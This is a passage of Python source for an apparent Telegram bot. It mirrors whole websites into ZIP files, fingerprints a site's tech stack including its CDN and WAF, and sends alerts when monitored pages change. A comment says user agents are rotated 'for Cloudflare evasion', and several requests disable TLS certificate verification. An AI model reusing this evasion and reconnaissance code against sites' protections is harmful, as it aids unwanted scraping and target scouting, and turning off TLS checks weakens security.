            tag['style'] = new_style

        # ── <style> block ─────────────────────────
        for tag in soup.find_all('style'):
            if tag.string:
                tag.string.replace_with(
                    _rewrite_css_urls(tag.string, page_url, page_local, domain_dir, page_origin)
                )

        # ── <svg><image href="..."> ───────────────
        for tag in soup.find_all('image'):
            for attr in ('href', 'xlink:href'):
                v = tag.get(attr, '')
                if v and not v.startswith('data:'):
                    full = urljoin(page_url, v)
                    if full.startswith(page_origin):
                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <use xlink:href> (SVG sprites) ────────
        for tag in soup.find_all('use'):
            for attr in ('href', 'xlink:href'):
                v = tag.get(attr, '')
                if v and v.startswith('/'):
                    full = urljoin(page_url, v.split('#')[0])
                    if full.startswith(page_origin):
                        frag = '#' + v.split('#')[1] if '#' in v else ''
                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir) + frag

        return str(soup)

    except Exception as _e:
        logger.debug(f"rewrite_html_links error: {_e}")
        return html  # fallback: return original


def _rewrite_css_urls(css: str, page_url: str, page_local: str, domain_dir: str, origin: str) -> str:
    """Rewrite url(...) references inside CSS string."""
    def _replacer(m):
        raw = m.group(1).strip("'\"").strip()
        if raw.startswith('data:'): return m.group(0)
        full = urljoin(page_url, raw)
        if full.startswith(origin):
            return f"url('{_url_to_rel_local(full, page_local, domain_dir)}')"
        return m.group(0)
    return re.sub(r'''url\(\s*(["\']?[^)"'\s]+["\']?)\s*\)''', _replacer, css)


def download_website(
    base_url: str,
    full_site: bool,
    use_js: bool,
    max_pages: int,
    max_assets: int,
    progress_cb=None,
    resume: bool = False,
    site_profile: SiteProfile = None,
    max_depth: int = 5,
    cookies: str = "",
    extra_headers: str = "",
) -> tuple:

    domain     = urlparse(base_url).netloc
    safe       = re.sub(r'[^\w\-]','_', domain)
    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
    os.makedirs(domain_dir, exist_ok=True)

    # ── Use or create SiteProfile ─────────────────
    if not isinstance(site_profile, SiteProfile):
        site_profile = detect_site_profile(base_url)
    ASSET_WORKERS = site_profile.asset_workers
    PAGE_DELAY    = site_profile.page_delay
    REQ_DELAY     = site_profile.req_delay

    if progress_cb:
        progress_cb(
            f"🔍 Site: *{site_profile.profile_name}*\n"
            f"{site_profile.summary()}"
        )

    state        = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
    visited      = set(state["visited"])
    dl_done      = set(state["downloaded"])
    known_assets = set(state["assets"])
    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}

    # ── Session with retry + connection pool ──────
    session = requests.Session()
    session.headers.update(_get_headers())
    _retry = Retry(total=3, backoff_factor=0.5,
                   status_forcelist=[429, 500, 502, 503, 504])
    _adapter = HTTPAdapter(
        max_retries=_retry,
        pool_connections=ASSET_WORKERS * 2,
        pool_maxsize=ASSET_WORKERS * 4
    )
    session.mount("http://",  _adapter)
    session.mount("https://", _adapter)

    # ── Apply custom cookies / headers (V30) ──────
    if cookies:
        for ck in cookies.split(';'):
            ck = ck.strip()
            if '=' in ck:
                k, v = ck.split('=', 1)
                session.cookies.set(k.strip(), v.strip())
    if extra_headers:
        for hdr in extra_headers.split('\n'):
            hdr = hdr.strip()
            if ':' in hdr:
                k, v = hdr.split(':', 1)
                session.headers[k.strip()] = v.strip()

    # ── Attach proxy to session if available ──────

    # ── Phase 0: Sitemap discovery ───────────────
    queue: deque  = deque([base_url])
    _depth_map: dict = {base_url: 0}  # URL → crawl depth
    if full_site and not resume:
        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
        sitemap_urls = fetch_sitemap(base_url)
        if sitemap_urls:
            stats['sitemap_urls'] = len(sitemap_urls)
            if progress_cb:
                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
            seen_q = set(queue)
            for u in list(sitemap_urls)[:max_pages]:
                if u not in visited and u not in seen_q:
                    queue.append(u)
                    seen_q.add(u)

    # ── Phase 1: Pages ──────────────────────────
    seen_q = set()
    deduped = deque()
    for u in queue:
        if u not in visited and u not in seen_q:
            deduped.append(u)
            seen_q.add(u)
    queue = deduped

    while queue and len(visited) < max_pages:
        url = queue.popleft()
        if url in visited: continue

        safe_ok, reason = is_safe_url(url)
        if not safe_ok:
            log_warn(url, f"SSRF blocked: {reason}")
            stats['failed'] += 1
            visited.add(_normalize_url(url))
            continue

        visited.add(url)
        html, js_used = fetch_page(url, use_js)
        if html is None:
            stats['failed'] += 1
            if REQ_DELAY: time.sleep(REQ_DELAY)
            continue

        local = safe_local_path(domain_dir, url)
        try:
            # ── V30: Rewrite HTML links to local relative paths ──
            rewritten_html = rewrite_html_links(html, url, domain_dir)
            with open(local,'w',encoding='utf-8',errors='replace') as f:
                f.write(rewritten_html)
            stats['pages'] += 1
        except Exception:
            stats['failed'] += 1
            continue

        # ── Parse HTML once, share between both functions ──
        soup = BeautifulSoup(html, _BS_PARSER)
        known_assets |= extract_assets(html, url, soup=soup)
        if full_site:
            cur_depth = _depth_map.get(url, 0)
            if cur_depth < max_depth:
                for link in get_internal_links(html, url, soup=soup):
                    if link not in visited and link not in seen_q:
                        queue.append(link)
                        seen_q.add(link)
                        _depth_map[link] = cur_depth + 1

        if stats['pages'] % 5 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb:
            bar = pbar(stats['pages'], max(len(visited), 1))
            progress_cb(
                f"📄 *Pages* [{site_profile.profile_name}]\n`{bar}`\n"
                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
                + (" ⚡JS" if js_used else "")
            )

        # Adaptive delay — prevent rate limiting on protected sites
        if PAGE_DELAY > 0:
            time.sleep(PAGE_DELAY)

    # ── Phase 2: Assets — PARALLEL download ─────
    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
    total_assets = len(asset_list) + len(dl_done)
    extra_css    = set()
    max_bytes    = MAX_ASSET_MB * 1024 * 1024
    # V30: Skip large binary files unless explicitly requested
    _SKIP_LARGE_EXTS = ('.mp4','.mkv','.avi','.mov','.wmv','.flv',
                        '.iso','.exe','.dmg','.pkg')
    _MAX_SINGLE_ASSET_BYTES = 50 * 1024 * 1024  # 50MB per single asset
    import threading as _threading
    _lock        = _threading.Lock()
    _rate_event  = _threading.Event()
    _rate_event.set()   # set = OK to proceed; clear = backing off 429

    def _download_asset(asset_url: str) -> tuple:
        """Download one asset. Handles 429 with backoff."""
        # Block if rate-limited (other thread detected 429)
        _rate_event.wait(timeout=60)

        safe_ok, reason = is_safe_url(asset_url)
        if not safe_ok:
            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
            return set(), set(), 0, False

        try:
            # Rotate UA per request for Cloudflare evasion
            resp = session.get(asset_url, headers=_get_headers(),
                               timeout=TIMEOUT, stream=True)

            # ── Smart 429 handling ─────────────────
            if resp.status_code == 429:
                retry_after = int(resp.headers.get('Retry-After', 15))
                retry_after = min(retry_after, 60)
                logger.warning("429 rate-limit on %s — pausing %ds", asset_url, retry_after)
                _rate_event.clear()        # pause all worker threads
                time.sleep(retry_after)
                _rate_event.set()          # resume all worker threads
                resp = session.get(asset_url, headers=_get_headers(),
                                   timeout=TIMEOUT, stream=True)

            resp.raise_for_status()

            cl = resp.headers.get('Content-Length')
            if cl and int(cl) > max_bytes:
                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
                return set(), set(), 0, False

            buf = io.BytesIO()
            for chunk in resp.iter_content(65536):
                buf.write(chunk)
                if buf.tell() > max_bytes:
                    log_warn(asset_url, "Asset size limit exceeded — skipped")
                    return set(), set(), 0, False

            content = buf.getvalue()
            local   = safe_local_path(domain_dir, asset_url)
            with open(local, 'wb') as f:
                f.write(content)
            size_kb = len(content) / 1024

            ct       = resp.headers.get('Content-Type', '')
            css_hits = set()
            js_hits  = set()
            if 'css' in ct or asset_url.lower().endswith('.css'):
                css_hits = extract_css_assets(content.decode('utf-8', 'replace'), asset_url)
            if 'javascript' in ct or asset_url.lower().endswith('.js'):
                js_hits  = extract_media_from_js(content.decode('utf-8', 'replace'), base_url)

            # Adaptive inter-request delay for rate-sensitive sites
            if REQ_DELAY > 0:
                time.sleep(REQ_DELAY)

            return css_hits, js_hits, size_kb, True

        except Exception:
            return set(), set(), 0, False

    # ── Run parallel asset downloads ──────────────
    completed = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=ASSET_WORKERS) as ex:
        fmap = {ex.submit(_download_asset, url): url for url in asset_list}
        for fut in concurrent.futures.as_completed(fmap):
            dl_done.add(fmap[fut])
            completed += 1
            try:
                css_hits, js_hits, size_kb, ok = fut.result()
                if ok:
                    with _lock:
                        stats['assets']  += 1
                        stats['size_kb'] += size_kb
                        extra_css        |= css_hits
                        known_assets     |= js_hits
                else:
                    with _lock:
                        stats['failed'] += 1
            except Exception:
                with _lock:
                    stats['failed'] += 1

            if completed % 30 == 0:
                save_resume(base_url, {"visited": list(visited),
                                       "downloaded": list(dl_done),
                                       "assets": list(known_assets),
                                       "stats": stats})
            if progress_cb and completed % 10 == 0:
                bar = pbar(completed, total_assets)
                progress_cb(
                    f"📦 *Assets* ⚡×{ASSET_WORKERS}\n`{bar}`\n"
                    f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
                )

    # ── Phase 3: CSS nested assets (recursive depth 3) ──
    def _dl_css_extra(asset_url):
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok: return 0, set(), False
        try:
            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()
            buf = io.BytesIO()
            for chunk in resp.iter_content(65536):
                buf.write(chunk)
                if buf.tell() > max_bytes: return 0, set(), False
            content = buf.getvalue()
            local   = safe_local_path(domain_dir, asset_url)
            # Rewrite CSS urls to local paths
            try:
                css_text = content.decode('utf-8', 'replace')
                page_local = safe_local_path(domain_dir, asset_url)
                rewritten_css = _rewrite_css_urls(
                    css_text, asset_url, page_local, domain_dir,
                    f"{urlparse(asset_url).scheme}://{urlparse(asset_url).netloc}"
                )
                with open(local, 'w', encoding='utf-8') as f:
                    f.write(rewritten_css)
            except Exception:
                with open(local, 'wb') as f:
                    f.write(content)
            # Extract nested @imports for recursive fetch
            nested = extract_css_assets(content.decode('utf-8', 'replace'), asset_url)
            return len(content) / 1024, nested, True
        except Exception:
            return 0, set(), False

    # Up to 3 levels of CSS @import recursion
    css_queue = list(extra_css - dl_done)[:200]
    for _depth in range(3):
        if not css_queue: break
        next_level = set()
        with concurrent.futures.ThreadPoolExecutor(max_workers=ASSET_WORKERS) as ex:
            fmap = {ex.submit(_dl_css_extra, u): u for u in css_queue}
            for fut in concurrent.futures.as_completed(fmap):
                dl_done.add(fmap[fut])
                try:
                    size_kb, nested, ok = fut.result()
                    if ok:
                        stats['assets']  += 1
                        stats['size_kb'] += size_kb
                        next_level |= (nested - dl_done)
                    else:
                        stats['failed'] += 1
                except Exception:
                    stats['failed'] += 1
        css_queue = list(next_level)[:100]  # max 100 per level

    # ── Phase 4: ZIP ─────────────────────────────
    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")

    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files in os.walk(domain_dir):
            for file in files:
                fp = os.path.join(root,file)
                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))

    shutil.rmtree(domain_dir, ignore_errors=True)
    clear_resume(base_url)

    size_mb = os.path.getsize(zip_path)/1024/1024

    if needs_split(zip_path):
        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
        parts = split_zip(zip_path)
        os.remove(zip_path)
        return parts, None, stats, size_mb
    return [zip_path], None, stats, size_mb


# ══════════════════════════════════════════════════
# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    "CMS": {
        "WordPress":     [r"wp-content/", r"wp-includes/", r"/wp-json/", r"wordpress", r"wp-login\.php"],
        "Joomla":        [r"joomla", r"/components/com_", r"/administrator/", r"Joomla!"],
        "Drupal":        [r"drupal", r"/sites/default/", r"Drupal\.settings", r"drupal\.js"],
        "Magento":       [r"magento", r"Mage\.Cookies", r"/skin/frontend/", r"mage/cookies"],
        "Shopify":       [r"cdn\.shopify\.com", r"shopify\.com/s/files", r"Shopify\.theme"],
        "WooCommerce":   [r"woocommerce", r"wc-ajax=", r"/wc-api/", r"WooCommerce"],
        "PrestaShop":    [r"prestashop", r"/modules/", r"presta_"],
        "OpenCart":      [r"opencart", r"route=common/home", r"catalog/view/theme"],
        "TYPO3":         [r"typo3", r"typo3conf", r"/typo3/"],
        "Ghost":         [r"ghost\.io", r"content/themes/casper"],
        "Wix":           [r"wix\.com", r"static\.parastorage\.com"],
        "Squarespace":   [r"squarespace\.com", r"squarespace-cdn"],
        "Webflow":       [r"webflow\.com", r"webflow\.io"],
        "Contentful":    [r"contentful\.com"],
        "Strapi":        [r"strapi"],
    },
    "JS_FRAMEWORK": {
        "React":         [r"react\.development\.js", r"react\.production\.min\.js", r"__REACT", r"_jsx\(", r"React\.createElement"],
        "Vue.js":        [r"vue\.min\.js", r"vue\.js", r"__vue__", r"Vue\.component", r"v-bind:", r"v-model="],
        "Angular":       [r"angular\.min\.js", r"ng-app=", r"ng-controller=", r"angular\.module", r"\[ngModel\]"],
        "Next.js":       [r"__NEXT_DATA__", r"/_next/static/", r"next/dist"],
        "Nuxt.js":       [r"__NUXT__", r"/_nuxt/", r"nuxt\.config"],
        "Svelte":        [r"svelte", r"__svelte"],
        "Ember.js":      [r"ember\.js", r"Ember\.Application"],
        "Backbone.js":   [r"backbone\.js", r"Backbone\.Model"],
        "jQuery":        [r"jquery\.min\.js", r"jquery-\d+\.\d+", r"\$\.ajax\(", r"jQuery\.fn"],
        "Alpine.js":     [r"alpine\.js", r"x-data=", r"x-show="],
        "Htmx":          [r"htmx\.org", r"hx-get=", r"hx-post="],
        "Three.js":      [r"three\.min\.js", r"THREE\.Scene"],
        "D3.js":         [r"d3\.min\.js", r"d3\.select"],
    },
    "BACKEND": {
        "PHP":           [r"X-Powered-By: PHP", r"\.php", r"PHPSESSID", r"php/\d"],
        "Laravel":       [r"laravel_session", r"X-Powered-By: PHP", r"laravel"],
        "Symfony":       [r"symfony", r"sf_redirect", r"_symfony"],
        "CodeIgniter":   [r"CodeIgniter", r"ci_session"],
        "CakePHP":       [r"cakephp", r"cake_"],
        "Django":        [r"django", r"csrfmiddlewaretoken", r"__django"],
        "Flask":         [r"Werkzeug/", r"flask", r"Flask"],
        "FastAPI":       [r"FastAPI", r"fastapi"],
        "Express.js":    [r"Express", r"X-Powered-By: Express"],
        "Ruby on Rails": [r"X-Powered-By: Phusion Passenger", r"ruby", r"_rails_", r"rails"],
        "ASP.NET":       [r"ASP\.NET", r"__VIEWSTATE", r"X-Powered-By: ASP\.NET", r"\.aspx"],
        "Spring":        [r"org\.springframework", r"spring", r"SPRING_"],
        "Go":            [r"Go-http-client", r"gin-gonic", r"echo framework"],
        "Node.js":       [r"X-Powered-By: Express", r"node\.js"],
        "Java":          [r"JSESSIONID", r"java", r"javax\.servlet"],
        "Perl":          [r"mod_perl", r"X-Powered-By: Perl"],
        "WordPress API": [r"/wp-json/wp/v2/"],
    },
    "WEB_SERVER": {
        "Nginx":         [r"nginx", r"Server: nginx"],
        "Apache":        [r"Apache", r"Server: Apache"],
        "IIS":           [r"Microsoft-IIS", r"Server: Microsoft-IIS"],
        "LiteSpeed":     [r"LiteSpeed", r"Server: LiteSpeed", r"X-LiteSpeed"],
        "Caddy":         [r"Caddy", r"Server: Caddy"],
        "Gunicorn":      [r"gunicorn", r"Server: gunicorn"],
        "Tomcat":        [r"Apache-Coyote", r"Tomcat"],
        "Kestrel":       [r"Kestrel", r"Microsoft-HTTPAPI"],
        "OpenResty":     [r"openresty", r"Server: openresty"],
    },
    "CDN_WAF": {
        "Cloudflare":    [r"cf-ray", r"cf-cache-status", r"__cfduid", r"cloudflare", r"Server: cloudflare"],
        "AWS CloudFront":[r"X-Amz-Cf-Id", r"CloudFront", r"x-amz-cf-pop"],
        "Akamai":        [r"X-Akamai", r"AkamaiGHost", r"akamai"],
        "Fastly":        [r"X-Fastly", r"Fastly-Debug", r"fastly"],
        "Sucuri":        [r"sucuri", r"X-Sucuri"],
        "Incapsula":     [r"incapsula", r"visid_incap", r"nlbi_"],
        "ModSecurity":   [r"Mod_Security", r"NOYB"],
        "AWS WAF":       [r"x-amzn-requestid", r"x-amz-apigw"],
        "Imperva":       [r"imperva", r"_iidt"],
    },
    "DATABASE": {
        "MySQL":         [r"mysql_", r"MySQLi", r"mysql\.sock"],
        "PostgreSQL":    [r"PostgreSQL", r"psql"],
        "MongoDB":       [r"mongodb", r"MongoClient"],
        "Redis":         [r"redis", r"Redis"],
        "Elasticsearch": [r"elasticsearch", r"elastic\.co"],
        "SQLite":        [r"sqlite", r"SQLite"],
    },
    "ANALYTICS": {
        "Google Analytics": [r"google-analytics\.com", r"gtag\(", r"UA-\d+-\d+", r"G-[A-Z0-9]+"],
        "Google Tag Manager":[r"googletagmanager\.com", r"GTM-"],
        "Facebook Pixel":[r"connect\.facebook\.net", r"fbq\(", r"fbevents\.js"],
        "Hotjar":        [r"hotjar\.com", r"hjid"],
        "Mixpanel":      [r"mixpanel\.com", r"mixpanel\.track"],
        "Segment":       [r"segment\.com", r"analytics\.js"],
        "Matomo":        [r"matomo\.js", r"piwik\.js", r"_paq\.push"],
        "Plausible":     [r"plausible\.io"],
        "Heap":          [r"heap\.io", r"heapanalytics"],
    },
    "JS_LIBRARY": {
        "Bootstrap":     [r"bootstrap\.min\.js", r"bootstrap\.min\.css", r"bootstrap/\d"],
        "Tailwind CSS":  [r"tailwindcss", r"tailwind\.min\.css"],
        "Font Awesome":  [r"font-awesome", r"fontawesome", r"fa-solid", r"fa-brands"],
        "Lodash":        [r"lodash\.min\.js", r"_\.cloneDeep"],
        "Axios":         [r"axios\.min\.js", r"axios\.get\("],
        "Moment.js":     [r"moment\.min\.js", r"moment\(\)"],
        "Chart.js":      [r"chart\.min\.js", r"Chart\.js"],
        "Swiper":        [r"swiper\.min\.js", r"swiper-slide"],
        "Select2":       [r"select2\.min\.js", r"select2-container"],
        "DataTables":    [r"datatables", r"DataTable\("],
        "Leaflet":       [r"leaflet\.js", r"L\.map\("],
        "GSAP":          [r"gsap\.min\.js", r"TweenMax"],
        "Anime.js":      [r"animejs", r"anime\("],
    },
    "PAYMENT": {
        "Stripe":        [r"stripe\.com/v3", r"Stripe\.js", r"pk_live_", r"pk_test_"],
        "PayPal":        [r"paypal\.com/sdk", r"paypalrestsdk"],
        "Braintree":     [r"braintreegateway\.com", r"braintree\.js"],
        "Square":        [r"squareup\.com", r"Square\.js"],
        "Authorize.Net": [r"authorize\.net"],
        "WooPayments":   [r"woocommerce-payments"],
    },
    "CLOUD_INFRA": {
        "AWS S3":        [r"s3\.amazonaws\.com", r"amazonaws\.com"],
        "AWS EC2":       [r"ec2.*\.amazonaws\.com"],
        "Heroku":        [r"herokussl\.com", r"herokuapp\.com"],
        "Vercel":        [r"vercel\.app", r"x-vercel-id"],
        "Netlify":       [r"netlify\.app", r"X-Nf-Request-Id"],
        "Railway":       [r"railway\.app"],
        "DigitalOcean":  [r"digitalocean", r"do-spaces"],
        "Google Cloud":  [r"googleapis\.com", r"storage\.cloud\.google"],
        "Azure":         [r"azurewebsites\.net", r"azure\.com"],
    },
    "SECURITY": {
        "reCAPTCHA":     [r"google\.com/recaptcha", r"grecaptcha"],
        "hCaptcha":      [r"hcaptcha\.com"],
        "Cloudflare Turnstile": [r"challenges\.cloudflare\.com"],
        "Auth0":         [r"auth0\.com", r"auth0\.js"],
        "Okta":          [r"okta\.com", r"oktacdn\.com"],
        "Keycloak":      [r"keycloak"],
        "JWT":           [r"eyJ[A-Za-z0-9_-]{10,}"],
    },
}


_NOTABLE_HEADERS = [
    'server', 'x-powered-by', 'x-generator', 'x-framework',
    'cf-ray', 'via', 'x-drupal-cache', 'x-varnish',
    'x-shopify-stage', 'x-wix-request-id',
]

async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/tech <url> — Detect technology stack"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/tech https://example.com`\n\n"
            "🔬 *Detects:*  CMS, JS frameworks, servers, CDN/WAF,\n"
            "analytics, backend tech, JS libraries & more.\n\n"
            f"Checks `{len(_TECH_SIGNATURES)}` known tech signatures.",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "TechStack"

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")

    def _do_tech_scan():
        # ── Reuse cached SiteProfile if available (no double request) ──
        domain_key = urlparse(url).netloc
        profile    = _PROFILE_CACHE.get(domain_key)

        resp = requests.get(
            url, headers=_get_headers(), timeout=TIMEOUT, verify=False, allow_redirects=True
        )
        body         = resp.text[:80000]
        headers_str  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        combined     = (body + headers_str).lower()

        detected = {}
        for tech, patterns in _TECH_SIGNATURES.items():
            for p in patterns:
                if re.search(p, combined, re.I):
                    detected[tech] = p
                    break

        # ── Augment with SiteProfile hints (free — no extra request) ──
        if profile:
            if profile.is_cloudflare and "Cloudflare" not in detected:
                detected["Cloudflare"] = "(profile)"
            if profile.is_wordpress and "WordPress" not in detected:
                detected["WordPress"] = "(profile)"
            if profile.is_shopify and "Shopify" not in detected:
                detected["Shopify"] = "(profile)"
            if profile.is_spa:
                for hint in profile.tech_hints:
                    if hint not in detected:
                        detected[hint] = "(profile)"

        # ── Cache this profile now if not yet cached ──
        if not profile:
            p2 = SiteProfile()
            if 'cloudflare' in combined: p2.is_cloudflare = True
            if 'wp-content' in combined: p2.is_wordpress  = True
            if 'shopify'    in combined: p2.is_shopify    = True
            p2._apply_profile_settings()
            _PROFILE_CACHE[domain_key] = p2

        notable = {
            k: v for k, v in resp.headers.items()
            if k.lower() in _NOTABLE_HEADERS
        }
        return detected, notable, resp.status_code, profile

    try:
        detected, notable, status, profile = await asyncio.to_thread(_do_tech_scan)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    profile_badge = f" | {profile.profile_name}" if profile else ""
    lines  = [f"🔬 *Tech Stack — `{domain}`*", f"Status: `{status}`{profile_badge}\n"]

    # Group by category
    _CAT = {
        "CMS":        ["WordPress","Drupal","Joomla","Ghost CMS","Shopify","WordPress (WooCommerce)"],
        "JS Frameworks":["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte"],
        "JS Libraries": ["jQuery","Bootstrap","Tailwind"],
        "Server":     ["Nginx","Apache","Caddy","LiteSpeed","IIS"],
        "CDN / WAF":  ["Cloudflare","Akamai","Fastly","AWS CloudFront"],
        "Analytics":  ["Google Analytics","Google Tag Manager","Hotjar"],
        "Backend":    ["PHP","Laravel","Django","Rails","ASP.NET"],
        "Services":   ["Stripe","Firebase","Supabase"],
    }

    any_found = False
    for cat, techs in _CAT.items():
        hits = [t for t in techs if t in detected]
        if hits:
            lines.append(f"*{cat}:*")
            for h in hits:
                lines.append(f"  ✅ `{h}`")
            lines.append("")
            any_found = True

    # Uncategorised
    known_all = {t for ts in _CAT.values() for t in ts}
    extras    = [t for t in detected if t not in known_all]
    if extras:
        lines.append("*Other:*")
        for t in extras:
            lines.append(f"  ✅ `{t}`")
        lines.append("")
        any_found = True

    if not any_found:
        lines.append("⚠️ No known tech signatures matched.")

    if notable:
        lines.append("*📋 Notable Headers:*")
        for k, v in list(notable.items())[:8]:
            lines.append(f"  `{k}: {v[:60]}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
    _active_scans.pop(uid, None)   # fix: release scan slot


# ══════════════════════════════════════════════════
# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
# ══════════════════════════════════════════════════
# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]

_monitor_app_ref = None   # set in main() to access app.bot

async def monitor_loop():
    """Background task — check monitored URLs for content changes every 60s."""
    global _monitor_app_ref
    while True:
        try:
            await asyncio.sleep(60)
            async with db_lock:
                db = _load_db_sync()

            changed_alerts = []  # (uid, entry, new_hash)
            now = time.time()

            for uid_str, monitors in db.get("monitors", {}).items():
                for entry in monitors:
                    interval_sec = entry.get("interval_min", 30) * 60
                    if now - entry.get("last_check", 0) < interval_sec:
                        continue
                    try:
                        resp      = requests.get(
                            entry["url"], headers=_get_headers(),
                            timeout=TIMEOUT, verify=False
                        )
                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
                        old_hash  = entry.get("last_hash", "")
                        entry["last_check"] = now

                        if old_hash and old_hash != new_hash:
                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
                        entry["last_hash"] = new_hash
                    except Exception as ex:
                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)

            async with db_lock:
                _save_db_sync(db)

            # Fire alerts
            if _monitor_app_ref and changed_alerts:
                for uid_str, entry, new_hash, status in changed_alerts:
                    try:
                        label = entry.get("label") or entry["url"][:40]
                        await _monitor_app_ref.bot.send_message(
                            chat_id=int(uid_str),
                            text=(
                                f"🔔 *Page Changed!*\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏷 *{label}*\n"
                                f"🔗 `{entry['url'][:60]}`\n"
                                f"📡 Status: `{status}`\n"
                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
                                f"New: `{new_hash[:16]}…`\n\n"
                                f"_Use /monitor list to manage alerts_"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.warning("Monitor alert send error: %s", e)

        except Exception as e:
            logger.error("Monitor loop error: %s", e)
            await asyncio.sleep(30)


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
    uid  = str(update.effective_user.id)
    args = context.args or []
    sub  = args[0].lower() if args else ""

    if not sub or sub == "help":
        await update.effective_message.reply_text(
            "🔔 *Page Monitor — Usage*\n\n"
            "`/monitor add <url> [interval] [label]`\n"
            "  └ interval = minutes (default 30, min 5)\n"
            "  └ label = custom name (optional)\n\n"
            "`/monitor list` — View all monitors\n"
            "`/monitor del <n>` — Remove by number\n"
            "`/monitor clear` — Remove all\n\n"
            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if "monitors" not in db:
            db["monitors"] = {}
        monitors = db["monitors"].setdefault(uid, [])

        if sub == "add":
            if len(args) < 2:
                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            url   = args[1].strip()
            if not url.startswith('http'):
                url = 'https://' + url
            safe_ok, reason = is_safe_url(url)
            if not safe_ok:
                await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
            if len(monitors) >= 10:
                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
                _save_db_sync(db)
                return
            monitors.append({
                "url": url, "label": label,
                "interval_min": interval,
                "last_hash": "", "last_check": 0,
                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ *Monitor Added*\n"
                f"🏷 `{label}`\n🔗 `{url[:60]}`\n⏱ Every `{interval}` min",
                parse_mode='Markdown'
            )

        elif sub == "list":
            _save_db_sync(db)
            if not monitors:
                await update.effective_message.reply_text("📭 No monitors set up yet.")
                return
            lines = ["🔔 *Your Monitors*\n"]
            for i, m in enumerate(monitors, 1):
                lines.append(
                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
                    f"   🔗 `{m['url'][:50]}`\n"
                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
                )
            await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

        elif sub == "del":
            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
            if 0 <= idx < len(monitors):
                removed = monitors.pop(idx)
                _save_db_sync(db)
                await update.effective_message.reply_text(
                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
                    parse_mode='Markdown'
                )
            else:
                _save_db_sync(db)
                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')

        elif sub == "clear":
            monitors.clear()
            _save_db_sync(db)
            await update.effective_message.reply_text("🗑 All monitors cleared.")

        else:
            _save_db_sync(db)
